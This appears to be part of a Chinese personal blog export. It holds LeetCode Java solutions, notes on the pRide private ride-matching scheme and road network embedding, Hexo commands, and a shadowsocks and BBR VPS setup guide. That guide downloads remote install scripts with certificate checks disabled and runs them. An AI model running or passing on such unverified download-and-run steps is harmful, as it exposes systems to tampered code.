<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">输入：(<span class="number">2</span> -&gt; <span class="number">4</span> -&gt; <span class="number">3</span>) + (<span class="number">5</span> -&gt; <span class="number">6</span> -&gt; <span class="number">4</span>)</span><br><span class="line">输出：<span class="number">7</span> -&gt; <span class="number">0</span> -&gt; <span class="number">8</span></span><br><span class="line">原因：<span class="number">342</span> + <span class="number">465</span> = <span class="number">807</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>题解很简单，就是遍历两个链表，设置一个carry作为进位</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;//这是定义了链表的节点</span></span><br><span class="line"><span class="comment"> *     int val;//节点有值</span></span><br><span class="line"><span class="comment"> *     ListNode next;//节点指向的下个节点</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;//节点的构造器，初始化val为传入x</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode result=<span class="keyword">new</span> ListNode(<span class="number">0</span>);<span class="comment">//做一个0值头指针</span></span><br><span class="line">        ListNode resultA=result;</span><br><span class="line">        <span class="keyword">int</span> carry=<span class="number">0</span>;<span class="comment">//进位值</span></span><br><span class="line">        <span class="keyword">int</span> i1,i2;<span class="comment">//遍历链表的值</span></span><br><span class="line">        <span class="keyword">int</span> sum;<span class="comment">//总数</span></span><br><span class="line">        <span class="comment">//carry!=0（carry=）是为了链表节点数一样，但是有进位的情况</span></span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="keyword">null</span>|l2!=<span class="keyword">null</span>|carry!=<span class="number">0</span>)<span class="comment">//链表还有下一个节点、或者还有下个进位就继续</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//这里是为了判断链表数不一样的情况</span></span><br><span class="line">            i1=l1!=<span class="keyword">null</span>?l1.val:<span class="number">0</span>;</span><br><span class="line">            i2=l2!=<span class="keyword">null</span>?l2.val:<span class="number">0</span>;</span><br><span class="line">            System.out.print(i1);        </span><br><span class="line">            sum=i1+i2+carry;</span><br><span class="line">            carry=sum/<span class="number">10</span>;<span class="comment">//把sum的进位留到下一个节点</span></span><br><span class="line">            ListNode newNode=<span class="keyword">new</span> ListNode(sum%<span class="number">10</span>);<span class="comment">//余数就放在当前新建节点       </span></span><br><span class="line">            result.next=newNode;</span><br><span class="line">            result=newNode;</span><br><span class="line">            l1=l1!=<span class="keyword">null</span>?l1.next:<span class="keyword">null</span>;<span class="comment">//遍历链表1</span></span><br><span class="line">            l2=l2!=<span class="keyword">null</span>?l2.next:<span class="keyword">null</span>;<span class="comment">//遍历链表2</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultA.next;<span class="comment">//返回0值头指针所指向的链表</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h1 id="5-最长回文子串"><a href="#5-最长回文子串" class="headerlink" title="5. 最长回文子串"></a>5. 最长回文子串</h1><p><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-palindromic-substring/</a></p>
<ul>
<li><p>给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。</p>
<p>示例 1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;babad&quot;</span><br><span class="line">输出: &quot;bab&quot;</span><br><span class="line">注意: &quot;aba&quot; 也是一个有效答案。</span><br></pre></td></tr></table></figure>
</li>
<li><p>主要的思路，就是遍历字符串的每个字符。</p>
<p>每个字符串从中间往外面寻找是否是回文，是的话继续寻找，直到两边字符不再相同，就停止。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length_s=s.length(),length_Palin=<span class="number">1</span>;</span><br><span class="line">        String result=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">int</span> first,second,first_next,second_next;</span><br><span class="line">        <span class="keyword">if</span>(length_s==<span class="number">1</span>) <span class="keyword">return</span> s;<span class="comment">//判断是否为一个字符，直接返回</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(length_s&gt;<span class="number">1</span>) result=s.substring(<span class="number">0</span>,<span class="number">1</span>);<span class="comment">//把第一个字符放进来，使得最少为一个字符</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//用两个指针遍历</span></span><br><span class="line">        <span class="keyword">for</span>(first=<span class="number">0</span>,second=<span class="number">1</span>;second&lt;length_s;first++,second++)&#123;</span><br><span class="line">            <span class="comment">//这是两个指针判断的回文</span></span><br><span class="line">            <span class="keyword">if</span>(s.charAt(first)==s.charAt(second))&#123;</span><br><span class="line">                first_next=first;second_next=second;</span><br><span class="line">                    <span class="keyword">while</span>(first_next-<span class="number">1</span>&gt;=<span class="number">0</span> &amp;&amp; second_next+<span class="number">1</span>&lt;length_s &amp;&amp; s.charAt(first_next-<span class="number">1</span>)==s.charAt(second_next+<span class="number">1</span>))&#123;</span><br><span class="line">                    first_next--;</span><br><span class="line">                    second_next++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(result.length()&lt;second_next-first_next+<span class="number">1</span>)&#123;</span><br><span class="line">                    result=s.substring(first_next, second_next+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           	<span class="comment">//这是一个指针判断的两侧回文</span></span><br><span class="line">            <span class="keyword">if</span>(second&lt;=length_s-<span class="number">2</span>&amp;&amp;s.charAt(second-<span class="number">1</span>)==s.charAt(second+<span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                first_next=second-<span class="number">1</span>;second_next=second+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(first_next-<span class="number">1</span>&gt;=<span class="number">0</span> &amp;&amp; second_next+<span class="number">1</span>&lt;length_s &amp;&amp; s.charAt(first_next-<span class="number">1</span>)==s.charAt(second_next+<span class="number">1</span>))&#123;</span><br><span class="line">                    first_next--;</span><br><span class="line">                    second_next++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(result.length()&lt;second_next-first_next+<span class="number">1</span>)&#123;</span><br><span class="line">                    result=s.substring(first_next, second_next+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h1 id="9-回文数"><a href="#9-回文数" class="headerlink" title="9.回文数"></a>9.回文数</h1><p><a href="https://leetcode-cn.com/problems/palindrome-number/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/palindrome-number/</a></p>
<ul>
<li><p>判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 121</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
</li>
<li><p>主要是借鉴了评论区高赞老哥的思路，因为x是int型,若逆序后(即12345-&gt;54321)溢出则不是回文序列。</p>
<p>分三种情况</p>
<p>1)x为负数,false<br>2)x逆序后,与原来x不同,溢出或非回文,false<br>3)x逆序后与原来x相同,回文,true</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">int</span> x_origin=x;</span><br><span class="line">        <span class="keyword">long</span> reserve=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">            reserve=reserve*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x=x/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">int</span>)reserve!=x_origin) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建机场简易教程shadowsocks centos7 vutlr bbr</title>
    <url>/2020/01/26/2020-01-26-shadowsocks-centos7-vutlr-bbr/</url>
    <content><![CDATA[<h2 id="1-获得vutlr服务器后-包含ip、用户名和密码-使用Xshell连接（其他连接器请自行百度）"><a href="#1-获得vutlr服务器后-包含ip、用户名和密码-使用Xshell连接（其他连接器请自行百度）" class="headerlink" title="1.获得vutlr服务器后(包含ip、用户名和密码)使用Xshell连接（其他连接器请自行百度）"></a>1.获得vutlr服务器后(包含ip、用户名和密码)使用Xshell连接（其他连接器请自行百度）</h2><h2 id="2-依次输入以下代码安装shadowsocks"><a href="#2-依次输入以下代码安装shadowsocks" class="headerlink" title="2.依次输入以下代码安装shadowsocks"></a>2.依次输入以下代码安装shadowsocks</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install wget</span><br></pre></td></tr></table></figure>

<h4 id="安装shadowsocks"><a href="#安装shadowsocks" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget –no-check-certificate -O shadowsocks.sh https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;teddysun&#x2F;shadowsocks_install&#x2F;master&#x2F;shadowsocks.sh</span><br></pre></td></tr></table></figure>

<h4 id="获取shadowsocks-sh读取权限"><a href="#获取shadowsocks-sh读取权限" class="headerlink" title="获取shadowsocks.sh读取权限"></a>获取shadowsocks.sh读取权限</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x shadowsocks.sh</span><br></pre></td></tr></table></figure>

<h4 id="设置个人shadowsocks密码和端口号"><a href="#设置个人shadowsocks密码和端口号" class="headerlink" title="设置个人shadowsocks密码和端口号"></a>设置个人shadowsocks密码和端口号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</span><br></pre></td></tr></table></figure>

<p>然后依次输入你的密码password、端口号(就是ss服务的端口号，后面连接使用)、加密模式(很多人推荐7 aes-256-cfb)</p>
<p>按任意键开始配置press any key to start，如果是第一次配置需要几分钟</p>
<h4 id="配置完之后可以看到用四行红字"><a href="#配置完之后可以看到用四行红字" class="headerlink" title="配置完之后可以看到用四行红字"></a>配置完之后可以看到用四行红字</h4><p>这个就是我们shadowsocks的连接信息了,其中除了ip是服务器自带的，端口、密码、加密模式都是我们自选的</p>
<h2 id="3-安装拥塞控制BBR加速上网"><a href="#3-安装拥塞控制BBR加速上网" class="headerlink" title="3.安装拥塞控制BBR加速上网"></a>3.安装拥塞控制BBR加速上网</h2><h4 id="安装BBR"><a href="#安装BBR" class="headerlink" title="安装BBR"></a>安装BBR</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https:&#x2F;&#x2F;github.com&#x2F;teddysun&#x2F;across&#x2F;raw&#x2F;master&#x2F;bbr.sh</span><br></pre></td></tr></table></figure>

<h4 id="获得读取权限"><a href="#获得读取权限" class="headerlink" title="获得读取权限"></a>获得读取权限</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x bbr.sh</span><br></pre></td></tr></table></figure>

<h4 id="启动BBR安装"><a href="#启动BBR安装" class="headerlink" title="启动BBR安装"></a>启动BBR安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;bbr.sh</span><br></pre></td></tr></table></figure>

<p>这步安装也蛮久的</p>
<p>按任意键安装，完成之后提示是否重启，输入y确定重启</p>
<p>重启之后</p>
<p>输入以下的指令查看BBR是否启动，若提示tcp_bbr则成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure>



<h2 id="4-在客户端重启ss，享受你的丝滑ss吧"><a href="#4-在客户端重启ss，享受你的丝滑ss吧" class="headerlink" title="4.在客户端重启ss，享受你的丝滑ss吧"></a>4.在客户端重启ss，享受你的丝滑ss吧</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service shadowsocks restart</span><br></pre></td></tr></table></figure>





<hr>
<p>参考链接</p>
<p>1.使用vultr(vps)搭建ss并开启BBR快速上网教程 超简单10分钟搞定</p>
<p><a href="https://wistbean.github.io/vultr-vps-bbr-ss.html" target="_blank" rel="noopener">https://wistbean.github.io/vultr-vps-bbr-ss.html</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>vpn</tag>
        <tag>centos</tag>
        <tag>vutlr</tag>
      </tags>
  </entry>
  <entry>
    <title>pRide具体方案</title>
    <url>/2020/01/23/2020-01-23-pRide-optimized-construction/</url>
    <content><![CDATA[<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123162426100.png" alt="图1"></p>
<center>这是一篇pRide具体方案的翻译简化版</center>
<a id="more"></a>

<h2 id="优化方案"><a href="#优化方案" class="headerlink" title="优化方案"></a>优化方案</h2><p>初始方案暂且不谈，先说优化方案。</p>
<p>一：地图分块，减少计算量</p>
<p>二：把路网嵌入向量打包起来，使得加密等操作可以一步完成</p>
<h3 id="步骤：Setup、Location-update、Ride-request、Ride-matching"><a href="#步骤：Setup、Location-update、Ride-request、Ride-matching" class="headerlink" title="步骤：Setup、Location-update、Ride-request、Ride-matching"></a>步骤：Setup、Location-update、Ride-request、Ride-matching</h3><p>为了保证分块后的精度，我们首先寻找与乘客所处区域α的最近司机，再以乘客到该司机的距离为半径来判断区域α周围的区域是否划入范围（就是看以该距离为半径的圆是否“触”到了周围区域）</p>
<h3 id="使用技术："><a href="#使用技术：" class="headerlink" title="使用技术："></a>使用技术：</h3><p>路网嵌入（ROAD NETWORK ENBEDDING），用于提高最短距离计算效率</p>
<p>同态加密 （Homomorphic），用于提供密文状态下的加法（及乘法）同步到明文中</p>
<p>混淆电路（Garbled Circuit），用于提供CP（    Crypto Provider）和ORH服务器的安全两方计算、有点像零知识证明</p>
<h3 id="一、初始化-Setup"><a href="#一、初始化-Setup" class="headerlink" title="一、初始化   Setup"></a>一、初始化   Setup</h3><p>1.ORH   地图分块(如图1所示)</p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123162426100.png" alt="图1"></p>
<p>​                                                                                  图  1</p>
<p>2.ORH   计算  地图道路的   路网嵌入向量</p>
<p>3.CP   初始化同态加密公钥并分发</p>
<h3 id="二、司机-位置更新-Location-update"><a href="#二、司机-位置更新-Location-update" class="headerlink" title="二、司机 位置更新   Location-update"></a>二、司机 位置更新   Location-update</h3><p>此步骤主要用于司机上传自己的位置信息（在pRide里是上传自己的路网嵌入信息）</p>
<p>1.司机端   计算自己的路网嵌入变量S</p>
<p>根据从服务器获取的地图道路路网嵌入向量、来在本地计算自己的路网嵌入向量S（这在路网嵌入已经讲过了）</p>
<p>2.司机端   把S打包成一个变量P</p>
<p>就是像进制位一样叠加维度S(如图2)</p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123162003661.png" alt="图2"></p>
<p>​                                                                                  图  2</p>
<p>3.司机端   把P用从CP获得的公钥加密成[P(b)]，把这个[P(b)]和所处区域Zα上传到ORH</p>
<p>4.ORH   随机生成一个路网嵌入向量u，并加密之成[P(u)]</p>
<p>5.ORH   使用[P(b)]-[P(u)]=&gt;[P(b‘)]</p>
<h3 id="三、乘客-乘车请求-Ride-request"><a href="#三、乘客-乘车请求-Ride-request" class="headerlink" title="三、乘客 乘车请求   Ride-request"></a>三、乘客 乘车请求   Ride-request</h3><p>1.乘客端   把自己的坐标x、y加密为[x]、[y]</p>
<p>2.乘客端   计算自己的路网嵌入向量S、打包、加密之得到[P(a)]</p>
<p>3.乘客端 上传[P(a)]、[x]、[y]、所处区域Zα给ORH</p>
<p>4.ORH   随机生成两随机数ηx、ηy，把其当做一个坐标值，计算其的网嵌入向量S、打包、加密之得到[P(η)]</p>
<p>5.ORH   计算    [P(η)]-[P(a)]=》[P(a’)]       ;        [x]-[ηx]=&gt;[x’]        ;        [y]-[ηy]=&gt;[y’]</p>
<p>《第五步是为了在4.2提高匹配精度的阶段判断坐标，所以把坐标也放到了距离向量中[P(a)]》</p>
<h3 id="四、ORH-乘车匹配-Ride-matching"><a href="#四、ORH-乘车匹配-Ride-matching" class="headerlink" title="四、ORH 乘车匹配   Ride-matching"></a>四、ORH 乘车匹配   Ride-matching</h3><h4 id="4-1-乘客所属区域zα匹配-Local-Zone-matching"><a href="#4-1-乘客所属区域zα匹配-Local-Zone-matching" class="headerlink" title="4.1.乘客所属区域zα匹配    Local Zone matching"></a>4.1.乘客所属区域zα匹配    Local Zone matching</h4><p>1.ORH   计算   [P(d)’]=[P(a)]-[P(b‘)]=[P(a)]-[P(b)]+[P(u)]</p>
<p>2.ORH   将 [P(d)’]发给CP</p>
<p>3.CP   解密 [P(d)’]得到 P(d)’、并且获得其混淆值 ~P(d)’   《这里的混淆电路还不太明白怎么操作的》</p>
<p>4.ORH   通过1-out-of-2 OT protocol 获得[P(u)]的混淆值  ~[P(u)]</p>
<p>5.通过算法2(如图3)判断两个司机哪个离乘客近</p>
<p>算法注释：</p>
<p>第一、二步是计算第一个司机到该乘客的最近距离(把P打包、第二步是找到两个P之间的最大值)</p>
<p>第三、四步同上计算第二个司机到该乘客的最近距离</p>
<p>第五步是判断哪个司机离乘客近</p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123170731309.png" alt="图3"></p>
<p>​                                                            图  3   上为算法、下为混淆电路</p>
<h4 id="4-2-提高匹配精度-Refinement"><a href="#4-2-提高匹配精度-Refinement" class="headerlink" title="4.2.提高匹配精度   Refinement"></a>4.2.提高匹配精度   Refinement</h4><p>1.ORH   把4.1中计算出来的，乘客所处区域zα与最近司机的[P(d)’] (4.1.1中计算)、</p>
<p>与[x]-[ηx]=&gt;[x’]        ;        [y]-[ηy]=&gt;[y’]都发给CP</p>
<p>2.CP   将其解密并获得混淆值 <del>P(d)’、</del>[x’]、~[y’]</p>
<p>3.ORH   通过1-out-of-2 OT protocol 获得~[P(η)]    ;        ~[ηx]    ;        ~[ηy]</p>
<p>4.通过如下图算法3(如图4)判断其他八块区域za1, za2, za3, za4, za5, za6, za7,za8（具体见图1）是否有需要计算的必要</p>
<p>算法注释：</p>
<p>第四步是计算乘客的坐标x、y</p>
<p>第五、六步是计算第一个司机到该乘客的最近距离(把P打包、第二步是找到两个P之间的最大值)</p>
<p>第七步是计算Γ   Γ是一个8位的二进制数，每一位指示一个区域是否该计算（就是看以该距离为半径的圆是否“触”到了周围区域，具体看图1）</p>
<p>第八步是判断 区域zα4是否该计算，后面9到15步同理，是很简单的距离判断（见图一）</p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123171733353.png" alt="图4"></p>
<p><img src="/2020/01/23/2020-01-23-pRide-optimized-construction/image-20200123171824965.png" alt="图4"></p>
<p>​                                                            图  4   上为算法、下为混淆电路</p>
<p>5.通过算法3获得有需要计算得必要的其他区域、</p>
<p>然后通过4.1Local Zone matching算法计算该区域中离乘客最近的司机，若该司机到乘客的距离B比乘客到本区域最短距离A小，就刷新最短距离A。最终我们得到距离最近的司机，并且将乘客位置信息发送给他………</p>
]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>pRide</tag>
        <tag>项目记录</tag>
      </tags>
  </entry>
  <entry>
    <title>路网嵌入 ROAD NETWORK EMBEDDING</title>
    <url>/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/</url>
    <content><![CDATA[<p>路网嵌入是一种用来计算最短道路距离的方案，通过记录每个节点（道路之间的交叉口）的信息，把常规的道路用多维空间向量表示，使得每个节点之间的距离更能更有效地被计算。</p>
<a id="more"></a>

<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>路网嵌入是一种用来计算最短道路距离的方案，通过记录每个节点（道路之间的交叉口）的信息，把常规的道路用多维空间向量表示，使得每个节点之间的距离更能更有效地被计算。</p>
<blockquote>
<p>Road Network Embedding (RNE), proposed by Shahabi et al.* [12], is an approach to compute shortest path distance in road networks, which bases on the LLR embedding techniques [19]. RNE transforms a road network into a higher dimensional space by assigning a sketch (i.e., a vector) to every node such that the distance between any two nodes can be efficiently approximated using only their sketches.</p>
</blockquote>
<h3 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h3><p>(1) 设G=(V,E)为路网（road network）</p>
<p>V代表道路之间的交叉节点，E（edge）代表道路。</p>
<p>(2)  V有n个，把V分成<strong>n个子集</strong>如下</p>
<p>V : R = {V1,1, . . . , V1,α, . . . , Vβ,1, . . . , Vβ,α}</p>
<blockquote>
<p>Let n = |V | be the size of the node set V . Define R as a set of O(log2n) reference sets, which are subsets of V : R = {V1,1, . . . , V1,α, . . . , Vβ,1, . . . , Vβ,α}, where α = O(log n) and β = O(log n).</p>
<p> Each subset Vi,ji is defined as a random subset of <em>V</em> with 2<em>i</em> nodes randomly chosen from <em>V</em> . </p>
</blockquote>
<p>(3) 一个节点到一个子集Vij的距离即该节点到这个子集的最近距离所有节点距离的最小值</p>
<blockquote>
<p>The distance between node v and subset Vi,j is defined as dist(v, Vi,j ) = minw∈Vi,j dist(v, w)</p>
</blockquote>
<p>(4) 对于一个节点，把其到每个子集的最短距离记录下来，构成一个S集，这个S集就是该节点的<strong>路网嵌入向量</strong>，然后我们把所有的向量放在一起，构成路网嵌入数据集。</p>
<p><img src="/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/image-20200122212143074.png" alt="4图"></p>
<p>(5) 假设一个点u，处于节点s和t之间，该节点u到某个子集Vij之间的距离可以如下公式计算，</p>
<p>dist(u，s)为点u到节点s的距离,dist(u,t)同理。</p>
<p><img src="/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/image-20200122212358662.png" alt="aaa"></p>
<p>(6) 根据上面的分析，对于该点u，我们也可以得到一个<strong>路网嵌入向量</strong>如下</p>
<p><img src="/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/image-20200122212654581.png" alt="6图"></p>
<p>(7) 最终，我们可以计算任意两点a,b的最短距离</p>
<p><img src="/2020/01/22/2020-01-22-ROAD-NETWORK-EMBEDDING/image-20200122212907442.png" alt></p>
]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>pRide</tag>
        <tag>项目记录</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo使用配置记录</title>
    <url>/2020/01/20/2020-01-20-hexo/</url>
    <content><![CDATA[<h1 id="简单的hexo命令"><a href="#简单的hexo命令" class="headerlink" title="简单的hexo命令"></a>简单的hexo命令</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.文章的生成及编辑</span><br><span class="line">hexo new “文章标题”</span><br><span class="line">博客所在路径\source_posts\”下生成一个md文件，文件名称为上面命令行所输入的文章标题</span><br><span class="line"></span><br><span class="line">2.文件发布</span><br><span class="line">hexo g generate</span><br><span class="line"></span><br><span class="line">3.本地测试</span><br><span class="line">hexo s </span><br><span class="line">访问localhost:4000来查看变化</span><br><span class="line"></span><br><span class="line">4.同步到github</span><br><span class="line">hexo d</span><br><span class="line"></span><br><span class="line">5.Hexo更换主题并发布到github</span><br><span class="line">安装hexo-deployer-git自动部署发布工具</span><br><span class="line">npm install hexo-deployer-git  --save</span><br><span class="line">发布到GitHub</span><br><span class="line">输入如下命令：hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line"></span><br><span class="line">6.如何一键式发布</span><br><span class="line">hexo clean</span><br><span class="line">hexo g -d</span><br><span class="line">可用以下简化（注意事项：下面的命令中 E:\github_repo\hexo_blog 是我博客的文件夹路径，请替换为你自己博客的路径，在git bash中输入命令）以后可以用hexo fuck来发布了</span><br><span class="line">git config --global alias.fuck &#39;!cd E:\github_repo\hexo_blog;hexo clean;hexo g;hexo d&#39;</span><br><span class="line">git fuck</span><br><span class="line">取消别名</span><br><span class="line">git config --global --unset alias.fuck</span><br></pre></td></tr></table></figure>

<h1 id="简单的markdown语法"><a href="#简单的markdown语法" class="headerlink" title="简单的markdown语法"></a>简单的markdown语法</h1><p><img src="/2020/01/20/2020-01-20-hexo/markdown-program.jpg" alt="markdown语法"></p>
<hr>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>1.GitHub+Hexo搭建个人博客（包括更改主题）真·从git、node.js从头教起必看</p>
<p><a href="https://blog.csdn.net/qq_37651252/article/details/97024874" target="_blank" rel="noopener">https://blog.csdn.net/qq_37651252/article/details/97024874</a> </p>
<p>2.通过hexo更新github pages博客</p>
<p><a href="https://www.jianshu.com/p/5fe8e618002d" target="_blank" rel="noopener">https://www.jianshu.com/p/5fe8e618002d</a></p>
<p>3.更换主题并且发布</p>
<p><a href="https://www.jianshu.com/p/20e1431abb83" target="_blank" rel="noopener">https://www.jianshu.com/p/20e1431abb83</a></p>
<p>4.Hexo的Next主题详细配置</p>
<p><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">https://www.jianshu.com/p/3a05351a37dc</a></p>
<p>5.初级看板娘</p>
<p><a href="https://blog.csdn.net/weixin_33738982/article/details/89621120" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33738982/article/details/89621120</a></p>
<p>6.进阶版看板娘</p>
<p><a href="https://blog.csdn.net/qq_39610915/article/details/90679768" target="_blank" rel="noopener">https://blog.csdn.net/qq_39610915/article/details/90679768</a></p>
<p>7.Hexo NexT 代码块复制功能</p>
<p><a href="https://www.jianshu.com/p/3e9d614c1e77" target="_blank" rel="noopener">https://www.jianshu.com/p/3e9d614c1e77</a></p>
<p>8.Hexo写博客时的图片问题</p>
<p><a href="https://blog.csdn.net/TimeJjc/article/details/86707165" target="_blank" rel="noopener">https://blog.csdn.net/TimeJjc/article/details/86707165</a></p>
<p>9.Hexo NexT主题中集成gitalk评论系统</p>
<p><a href="https://asdfv1929.github.io/2018/01/20/gitalk/" target="_blank" rel="noopener">https://asdfv1929.github.io/2018/01/20/gitalk/</a></p>
<p>10.Hexo博客提交百度和Google收录</p>
<p><a href="https://www.jianshu.com/p/f8ec422ebd52" target="_blank" rel="noopener">https://www.jianshu.com/p/f8ec422ebd52</a></p>
<p>Hexo优化:创建sitemap站点地图并向Google站长工具提交</p>
<p><a href="https://blog.csdn.net/MobiusStrip/article/details/87258612" target="_blank" rel="noopener">https://blog.csdn.net/MobiusStrip/article/details/87258612</a></p>
<p>Google sitemap 不允许的网址的解决办法</p>
<p><a href="https://alanlee.fun/2017/12/30/google-sitemap/" target="_blank" rel="noopener">https://alanlee.fun/2017/12/30/google-sitemap/</a></p>
<p>11.markdown语法简介</p>
<p><a href="http://www.markdown.cn/" target="_blank" rel="noopener">http://www.markdown.cn/</a></p>
<p>12.更多优化如加载进度条等</p>
<p><a href="https://zhuanlan.zhihu.com/p/85037898" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/85037898</a></p>
<p>13.Hexo添加字数统计、阅读时长</p>
<p><a href="https://blog.csdn.net/weixin_33753003/article/details/86257475" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33753003/article/details/86257475</a></p>
<p>14.Hexo博客NexT主题美化之自定义文章底部版权声明</p>
<p><a href="https://www.jianshu.com/p/93170e7413e9" target="_blank" rel="noopener">https://www.jianshu.com/p/93170e7413e9</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>test2</title>
    <url>/2020/01/15/2020-01-15-jottings/</url>
